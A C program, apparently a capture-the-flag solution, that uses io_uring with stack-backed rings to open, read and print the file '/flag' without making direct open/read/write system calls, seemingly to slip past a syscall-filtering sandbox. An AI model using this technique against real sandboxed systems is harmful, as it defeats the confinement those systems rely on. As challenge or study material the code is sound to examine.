#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/io_uring.h>
#include <stdlib.h>
#include <errno.h>

/* Define Page Size */
#define PAGE_SIZE 4096

static int ring_fd;
static struct io_uring_sqe *sqes;
static struct io_uring_cqe *cqes;

static uint32_t *sq_tail, *sq_head, *sq_mask;
static uint32_t *cq_tail, *cq_head, *cq_mask;

static inline int enter_syscall(int to_submit, int min_complete) {
    return syscall(__NR_io_uring_enter, ring_fd,
                   to_submit, min_complete,
                   IORING_ENTER_GETEVENTS, NULL, 0);
}

/* setup accepts pointers to the pre-allocated stack memory */
static void setup(void *rings_ptr, void *sqes_ptr) {
    struct io_uring_params p = {0};

    p.sq_entries = 1;
    p.cq_entries = 1;
    p.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;

    /* Tell kernel where the memory is */
    p.cq_off.user_addr = (uint64_t)(unsigned long)rings_ptr;
    p.sq_off.user_addr = (uint64_t)(unsigned long)sqes_ptr;

    ring_fd = syscall(__NR_io_uring_setup, 8, &p);
    if (ring_fd < 0) {
        perror("io_uring_setup");
        exit(1);
    }

    /* SQEs: user-provided sqes_ptr */
    sqes = (struct io_uring_sqe *)sqes_ptr;

    /* Map offsets to our stack buffer */
    void *ring_base = rings_ptr;
    sq_head = (uint32_t *)((char *)ring_base + p.sq_off.head);
    sq_tail = (uint32_t *)((char *)ring_base + p.sq_off.tail);
    sq_mask = (uint32_t *)((char *)ring_base + p.sq_off.ring_mask);

    cq_head = (uint32_t *)((char *)ring_base + p.cq_off.head);
    cq_tail = (uint32_t *)((char *)ring_base + p.cq_off.tail);
    cq_mask = (uint32_t *)((char *)ring_base + p.cq_off.ring_mask);
    cqes = (struct io_uring_cqe *)((char *)ring_base + p.cq_off.cqes);
}

static int submit_sqe(struct io_uring_sqe *sqe) {
    uint32_t t = *sq_tail;
    uint32_t idx = t & *sq_mask;
    printf("[*] submit_sqe: %d\n", idx);

    memcpy(&sqes[idx], sqe, sizeof(*sqe));
    *sq_tail = t + 1;

    if (enter_syscall(1, 1) < 0) { perror("enter"); _exit(1); }

    while (*cq_head == *cq_tail) ;
    uint32_t cidx = *cq_head & *cq_mask;
    int res = cqes[cidx].res;
    (*cq_head)++;

    return res;
}

int main() {
    /* 1. Allocate on Stack 
       2. Use __attribute__((aligned(PAGE_SIZE)))
       3. Zero out memory (mmap does this automatically, stack does not)
    */
    uint8_t rings_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
    uint8_t sqes_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

    memset(rings_stack, 0, PAGE_SIZE);
    memset(sqes_stack, 0, PAGE_SIZE);

    /* Pass stack addresses to setup */
    setup(rings_stack, sqes_stack);

    char path[] = "/flag";
    char buf[4096];

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = AT_FDCWD;
    sqe.addr = (unsigned long)path;
    sqe.open_flags = O_RDONLY;

    int fd = submit_sqe(&sqe);
    if (fd < 0) {
        write(2, "open failed\n", 12);
        return 1;
    }
    printf("[*] File opened with fd: %x\n", fd);

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_READ;
    sqe.fd = fd;
    sqe.addr = (unsigned long)buf;
    sqe.len = sizeof(buf);

    int r = submit_sqe(&sqe);
    if (r < 0) {
        write(2, "read failed\n", 12);
        return 1;
    }

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd = 1;
    sqe.addr = (unsigned long)buf;
    sqe.len = r;

    submit_sqe(&sqe);

    return 0;
}